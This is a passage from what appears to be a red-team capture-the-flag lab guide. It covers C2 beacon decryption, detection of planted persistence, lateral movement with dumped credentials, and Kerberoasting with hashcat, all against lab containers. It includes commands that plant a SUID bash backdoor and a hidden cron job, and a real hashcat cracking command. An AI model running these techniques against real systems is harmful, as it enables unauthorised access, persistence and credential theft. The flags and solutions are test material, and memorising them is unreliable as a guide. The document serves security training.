python3 c2_beacon.py --url http://172.30.0.10:8080/beacon --bruteforce
```

**Expected output:**
```
[+] Decryption successful!
    cmd: whoami
    flag: CTF{c2_beacon_d3c0d3d_succ3ss}
```

---

## Challenge 2: Persistence Mechanism Detection

### Objective

Find all persistence mechanisms planted by an attacker on a compromised system and assemble the flag fragments hidden in each persistence item.

**Flag format**: `CTF{p3rs1st3nc3_m3ch4n1sm_f0und}`

### Scenario

One internal system is suspected to be compromised. Intelligence indicates the attacker planted at least 3 persistence mechanisms. Investigate crontabs, SUID binaries, and environment variable-based backdoors to find the hidden flag fragments.

### Hints

1. Check `crontab -l` and `/etc/cron.*` directories
2. Enumerate SUID files with `find / -perm -4000 2>/dev/null`
3. Malicious code may be injected into `/etc/profile.d/` and `~/.bashrc`
4. Check hidden files (files starting with `.`)
5. Flag fragments are hidden in comments or environment variables of each persistence item

### Solution

```bash
# Plant persistence mechanisms on victim
docker exec victim-01 bash -c "
  echo '*/5 * * * * /tmp/.hidden_script.sh # PART1=CTF{p3rs1st3nc3' | crontab -
  echo '# PART2=_m3ch4n1sm' >> /root/.bashrc
  echo 'alias ls=\"ls --color=auto\"  # PART3=_f0und}' >> /root/.bashrc
  cp /bin/bash /tmp/.suid_backdoor && chmod u+s /tmp/.suid_backdoor
"

# Run detection
python3 persistence_hunter.py --container victim-01
```

---

## Challenge 3: WMI/PSExec-Style Lateral Movement

### Objective

Simulate WMI and PSExec-style lateral movement in a red team environment and retrieve the flag from the target system.

**Flag format**: `CTF{l4t3r4l_m0v3m3nt_v14_wm1}`

### Scenario

Initial foothold has been established on an internal network. Credential dumping yielded `CORP\administrator : P@ssw0rd123`. Use these credentials to move laterally to the adjacent system (172.30.0.30) and read C:\flag.txt.

### Solution

```bash
# Set up target system with flag
docker exec dc-01 bash -c "
  mkdir -p /C && echo 'CTF{l4t3r4l_m0v3m3nt_v14_wm1}' > /C/flag.txt
  python3 -m http.server 8888 &
"

# Execute lateral movement
python3 lateral_movement.py --target 172.30.0.30 \
  --user administrator --pass "P@ssw0rd123" --domain CORP
```

---

## Challenge 4: Active Directory Enumeration & Kerberoasting

### Objective

Enumerate an AD environment to find service accounts, extract service tickets via Kerberoasting, crack the ticket offline, and obtain the flag.

**Flag format**: `CTF{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}`

### Scenario

Domain user credentials (`jsmith:Welcome1`) have been obtained. Find SPN-registered accounts in AD, request TGS tickets, and recover the service account password through offline cracking.

### Hints

1. Use `GetUserSPNs.py` to query SPN-registered accounts
2. Kerberoasting only requires domain user privileges
3. Extracted hashes are in `$krb5tgs$23$*...*` format
4. Use Hashcat mode 13100
5. Use the rockyou.txt wordlist

### Solution

```bash
# Enumerate AD and Kerberoast
python3 ad_enum.py --dc 172.30.0.30 --domain corp.local \
  --user jsmith --pass Welcome1 --kerberoast --crack

# Real-world Hashcat command
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force
```

**Expected output:**
```
[+] Kerberoastable accounts found: 2
    - svc-sql: MSSQLSvc/db01.corp.local:1433
    - svc-web: HTTP/web01.corp.local

[+] Flag: CTF{k3rb3r0ast1ng_svc_4cc0unt_cr4ck3d}
```

---

## Cleanup

```bash
docker stop c2-server victim-01 dc-01 2>/dev/null
docker rm c2-server victim-01 dc-01 2>/dev/null
docker network rm redteam-lab 2>/dev/null
```
